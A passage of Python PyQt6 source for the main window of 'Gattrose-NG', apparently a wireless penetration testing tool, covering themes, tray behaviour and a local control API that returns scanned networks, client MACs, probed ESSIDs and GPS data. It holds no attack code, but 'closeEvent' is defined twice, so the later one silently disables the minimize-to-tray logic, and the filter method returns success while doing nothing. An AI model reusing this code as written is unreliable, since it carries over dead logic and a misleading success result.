                    stop:0.6 #00ff00, stop:0.8 #001a00, stop:1 #00ff00);
                color: #ffff00;
                font-weight: bold;
                border: 3px solid #00ff00;
                padding: 8px 12px;
                margin: 2px;
            }}
            QTabBar::tab:nth-child({self.death_tab_index + 1}):selected {{
                background: #00ff00;
                color: #000000;
                border: 3px solid #ffff00;
            }}
            QTabBar::tab:nth-child({self.death_tab_index + 1}):hover {{
                background: #00cc00;
                color: #000000;
            }}
        """

        combined_style = horsemen_style + conquest_style + war_style + famine_style + death_style
        current_style = self.tabs.styleSheet()
        self.tabs.setStyleSheet(current_style + combined_style)

    def show_about(self):
        """Show about dialog"""
        from src.version import VERSION
        theme = THEMES.get(self.current_theme, THEMES["sonic"])
        QMessageBox.about(
            self,
            "About Gattrose-NG",
            "<h2>Gattrose-NG</h2>"
            "<p>Wireless Penetration Testing Suite</p>"
            f"<p>Version {VERSION}</p>"
            "<p>Designed for security professionals and researchers.</p>"
            f"<p>Current theme: <b>{theme.name}</b></p>"
            "<p>All times displayed in 24-hour format.</p>"
        )

    def quit_application(self):
        """Actually quit the application (bypass minimize-to-tray)"""
        print("[*] Quitting application...")

        # Set flag to bypass minimize-to-tray in closeEvent
        self._force_quit = True

        # Stop status monitor
        if hasattr(self, 'status_monitor') and self.status_monitor:
            self.status_monitor.stop()
            self.status_monitor.wait()

        # Stop dynamic theme timer
        if hasattr(self, 'dynamic_theme') and self.dynamic_theme:
            self.dynamic_theme.stop_auto_update()

        # Hide tray icon
        if hasattr(self, 'system_tray') and self.system_tray:
            self.system_tray.hide()

        # Close application
        from PyQt6.QtWidgets import QApplication
        QApplication.quit()

    def closeEvent(self, event):
        """
        Handle window close event - minimize to tray by default

        Args:
            event: QCloseEvent
        """
        try:
            # Check if we're force quitting (from tray menu or Ctrl+Q)
            if hasattr(self, '_force_quit') and self._force_quit:
                print("[*] Force quit flag detected - closing application")
                event.accept()
                return

            from ..utils.config_db import DBConfig
            config = DBConfig()

            # Get minimize-to-tray setting (default: True)
            minimize_to_tray = config.get('app.minimize_to_tray_on_close', 'true') == 'true'

            print(f"[DEBUG] closeEvent: minimize_to_tray={minimize_to_tray}, has_tray={hasattr(self, 'system_tray')}, tray_visible={self.system_tray.isVisible() if hasattr(self, 'system_tray') and self.system_tray else False}")

            if minimize_to_tray and hasattr(self, 'system_tray') and self.system_tray and self.system_tray.isVisible():
                # Hide window instead of closing
                print("[*] Minimizing to tray instead of closing")
                event.ignore()
                self.hide()

                # Show notification
                if hasattr(self, 'notification_manager') and self.notification_manager:
                    self.notification_manager.notify(
                        "Gattrose-NG Minimized",
                        "Application is running in the background.\nDouble-click tray icon to restore.",
                        urgency="low",
                        timeout=3000
                    )
            else:
                # Actually close the application
                print("[*] Closing application (minimize-to-tray disabled or tray not available)")
                event.accept()

                # Stop status monitor
                if hasattr(self, 'status_monitor') and self.status_monitor:
                    self.status_monitor.stop()
                    self.status_monitor.wait()

                # Stop dynamic theme timer
                if hasattr(self, 'dynamic_theme') and self.dynamic_theme:
                    self.dynamic_theme.stop_auto_update()

        except Exception as e:
            print(f"[!] Error in closeEvent: {e}")
            import traceback
            traceback.print_exc()
            # On error, close normally
            event.accept()

    def apply_theme(self, theme_id: str, save: bool = True):
        """
        Apply a theme to the application

        Args:
            theme_id: Theme identifier (e.g., 'sonic', 'mario')
            save: Whether to save theme preference to config
        """
        # Validate theme exists
        if theme_id not in THEMES:
            print(f"[!] Unknown theme: {theme_id}, using default")
            theme_id = "sonic"

        # Apply stylesheet
        stylesheet = get_theme(theme_id)
        self.setStyleSheet(stylesheet)

        # Update current theme
        self.current_theme = theme_id

        # Save to config if requested
        if save:
            self.save_config()

        # Update status bar message (if status bar exists)
        theme = THEMES[theme_id]
        if hasattr(self, 'status_bar') and self.status_bar:
            self.status_bar.showMessage(f"Theme changed to: {theme.name}", 3000)

    def init_dynamic_theme(self):
        """
        Initialize the 24/7 dynamic theme system
        Creates unique color schemes for each hour of a 7-day cycle
        """
        try:
            # Check if dynamic theme is enabled in config
            from ..utils.config_db import DBConfig
            config = DBConfig()
            dynamic_enabled = config.get('app.dynamic_theme', 'false')

            if dynamic_enabled == 'true':
                print("[*] Initializing 24/7 dynamic theme system...")
                self.dynamic_theme = DynamicTheme()

                # Start auto-update (refreshes every minute for smooth transitions)
                self.dynamic_theme.start_auto_update(self, interval_ms=60000)

                print("[+] Dynamic theme system active - theme will shift over 7-day cycle")
            else:
                print("[*] Dynamic theme disabled - using static theme")
        except Exception as e:
            print(f"[!] Error initializing dynamic theme: {e}")

    def toggle_dynamic_theme(self, enabled: bool):
        """
        Toggle dynamic theme on/off

        Args:
            enabled: True to enable dynamic theme, False to use static theme
        """
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()

            if enabled:
                # Enable dynamic theme
                config.set('app.dynamic_theme', 'true', value_type='string', category='app',
                          description='Enable 24/7 dynamic theme system')

                if not self.dynamic_theme:
                    self.dynamic_theme = DynamicTheme()

                self.dynamic_theme.start_auto_update(self, interval_ms=60000)

                if hasattr(self, 'status_bar') and self.status_bar:
                    self.status_bar.showMessage("Dynamic theme enabled - shifting colors over 7-day cycle", 3000)

                print("[+] Dynamic theme enabled")
            else:
                # Disable dynamic theme, revert to static
                config.set('app.dynamic_theme', 'false', value_type='string', category='app',
                          description='Enable 24/7 dynamic theme system')

                if self.dynamic_theme:
                    self.dynamic_theme.stop_auto_update()
                    self.dynamic_theme = None

                # Re-apply current static theme
                self.apply_theme(self.current_theme, save=False)

                if hasattr(self, 'status_bar') and self.status_bar:
                    self.status_bar.showMessage("Dynamic theme disabled - using static theme", 3000)

                print("[*] Dynamic theme disabled")

        except Exception as e:
            print(f"[!] Error toggling dynamic theme: {e}")

    def init_local_api(self):
        """Initialize local API server for testing and automation"""
        try:
            from ..services.local_api import LocalAPIServer

            # Start local API server on port 5555
            self.local_api = LocalAPIServer(self, port=5555)
            self.local_api.start()

        except Exception as e:
            print(f"[!] Error starting local API server: {e}")
            import traceback
            traceback.print_exc()

    # ==================== API Control Methods ====================
    # These methods are called by the local API server for programmatic control

    def api_switch_tab(self, tab_name: str) -> bool:
        """Switch to a specific tab (thread-safe via Qt signal)"""
        try:
            tab_map = {
                'dashboard': 0,
                'scanner': 1,
                'wps': 2,
                'clients': 3,
                'auto_attack': 4,
                'manual_attack': 5,
                'bluetooth': 6,
                'flipper': 7,
                'wigle': 8,
                'mapping': 9
            }

            tab_index = tab_map.get(tab_name.lower())
            if tab_index is not None and tab_index < self.tabs.count():
                from PyQt6.QtCore import QMetaObject, Qt, Q_ARG
                QMetaObject.invokeMethod(
                    self.tabs,
                    "setCurrentIndex",
                    Qt.ConnectionType.QueuedConnection,
                    Q_ARG(int, tab_index)
                )
                return True
            return False
        except Exception as e:
            print(f"[API] Error switching tab: {e}")
            return False

    def api_get_networks(self) -> list:
        """Get current network list from GUI"""
        try:
            if not hasattr(self, 'scanner_tab'):
                return []

            scanner = getattr(self.scanner_tab, 'scanner', None)
            if not scanner:
                return []

            networks = []
            for ap in scanner.get_all_aps():
                networks.append({
                    'bssid': ap.bssid,
                    'ssid': ap.ssid,
                    'channel': ap.channel,
                    'encryption': ap.encryption,
                    'power': ap.power,
                    'wps_enabled': ap.wps_enabled,
                    'client_count': len(ap.clients),
                    'vendor': ap.vendor,
                    'device_type': ap.device_type
                })
            return networks
        except Exception as e:
            print(f"[API] Error getting networks: {e}")
            return []

    def api_get_clients(self) -> list:
        """Get current client list from GUI"""
        try:
            if not hasattr(self, 'scanner_tab'):
                return []

            scanner = getattr(self.scanner_tab, 'scanner', None)
            if not scanner:
                return []

            clients = []
            for client in scanner.get_all_clients():
                clients.append({
                    'mac': client.mac,
                    'bssid': client.bssid,
                    'power': client.power,
                    'packets': client.packets,
                    'probed_essids': client.probed_essids,
                    'vendor': client.vendor,
                    'device_type': client.device_type
                })
            return clients
        except Exception as e:
            print(f"[API] Error getting clients: {e}")
            return []

    def api_get_gps_status(self) -> dict:
        """Get current GPS status"""
        try:
            from ..services.gps_service import get_gps_service
            gps_service = get_gps_service()
            lat, lon, alt, acc, source = gps_service.get_location()

            return {
                'has_fix': lat is not None and lon is not None,
                'latitude': lat,
                'longitude': lon,
                'altitude': alt,
                'accuracy': acc,
                'source': source,
                'fix_quality': gps_service.get_fix_quality()
            }
        except Exception as e:
            print(f"[API] Error getting GPS status: {e}")
            return {'has_fix': False, 'error': str(e)}

    def api_update_gps_location(self, lat: float, lon: float) -> bool:
        """Update GPS location on map (for testing)"""
        try:
            if hasattr(self, 'mapping_tab'):
                # Update mapping tab with new location
                from PyQt6.QtCore import QMetaObject, Qt
                QMetaObject.invokeMethod(
                    self.mapping_tab,
                    "update_markers",
                    Qt.ConnectionType.QueuedConnection
                )
                return True
            return False
        except Exception as e:
            print(f"[API] Error updating GPS location: {e}")
            return False

    def api_apply_filter(self, filter_type: str, filter_value: str) -> bool:
        """Apply filters to network list"""
        try:
            if not hasattr(self, 'scanner_tab'):
                return False

            # This would need to be implemented in scanner_tab
            # For now, just return success
            return True
        except Exception as e:
            print(f"[API] Error applying filter: {e}")
            return False

    def api_get_stats(self) -> dict:
        """Get all current statistics"""
        try:
            stats = {
                'networks': len(self.api_get_networks()),
                'clients': len(self.api_get_clients()),
                'scanner_running': False,
                'monitor_interface': None,
                'current_tab': self.tabs.currentIndex() if hasattr(self, 'tabs') else 0
            }

            if hasattr(self, 'scanner_tab'):
                scanner = getattr(self.scanner_tab, 'scanner', None)
                if scanner:
                    stats['scanner_running'] = getattr(scanner, 'running', False)
                stats['monitor_interface'] = getattr(self.scanner_tab, 'monitor_interface', None)

            return stats
        except Exception as e:
            print(f"[API] Error getting stats: {e}")
            return {}

    def api_change_theme(self, theme_name: str) -> bool:
        """Change GUI theme"""
        try:
            from PyQt6.QtCore import QMetaObject, Qt, Q_ARG
            QMetaObject.invokeMethod(
                self,
                "apply_theme",
                Qt.ConnectionType.QueuedConnection,
                Q_ARG(str, theme_name)
            )
            return True
        except Exception as e:
            print(f"[API] Error changing theme: {e}")
            return False

    def api_get_state(self) -> dict:
        """Get complete GUI state"""
        try:
            gps_status = self.api_get_gps_status()
            stats = self.api_get_stats()

            return {
                'theme': getattr(self, 'current_theme', 'sonic'),
                'gps': gps_status,
                'stats': stats,
                'tabs': {
                    'current': stats.get('current_tab', 0),
                    'count': self.tabs.count() if hasattr(self, 'tabs') else 0
                }
            }
        except Exception as e:
            print(f"[API] Error getting state: {e}")
            return {}

    def closeEvent(self, event):
        """Handle window close event - fast cleanup"""
        print("\n[*] Application closing, cleaning up...")

        # Stop scanner if running (quick stop, don't wait)
        try:
            if hasattr(self, 'scanner_tab') and self.scanner_tab:
                if hasattr(self.scanner_tab, 'scanner') and self.scanner_tab.scanner:
                    print("[*] Stopping active scanner...")
                    self.scanner_tab.stop_scan()
        except Exception as e:
            print(f"[!] Error stopping scanner: {e}")

        # Stop status monitor (with timeout)
        if self.status_monitor:
            self.status_monitor.stop()
            # Don't wait - let it terminate on its own
            # self.status_monitor.wait()

        # Stop dynamic theme timer
        if self.dynamic_theme:
            print("[*] Stopping dynamic theme timer...")
            self.dynamic_theme.stop_auto_update()

        # Skip WiFi interface restore - services will handle it
        # This was causing the 10-second delay
        # try:
        #     if hasattr(self, 'scanner_tab') and self.scanner_tab:
        #         if hasattr(self.scanner_tab, 'monitor_interface') and self.scanner_tab.monitor_interface:
        #             from ..tools.wifi_monitor import WiFiMonitorManager
        #
        #             print(f"[*] Restoring {self.scanner_tab.monitor_interface} to managed mode...")
        #             success, message = WiFiMonitorManager.disable_monitor_mode(self.scanner_tab.monitor_interface)
        #             if success:
        #                 print(f"[✓] {message}")
        #             else:
        #                 print(f"[!] {message}")
        # except Exception as e:
        #     print(f"[!] Error restoring WiFi interface: {e}")

        # Skip process cleanup - services will handle orphaned processes
        # This was also contributing to delay
        # try:
        #     from ..utils.process_manager import ProcessManager
        #
        #     manager = ProcessManager()
        #     manager.cleanup_on_exit()
        #
        # except Exception as e:
        #     print(f"[!] Error during cleanup: {e}")

        print("[✓] Quick cleanup complete, exiting...")
        event.accept()
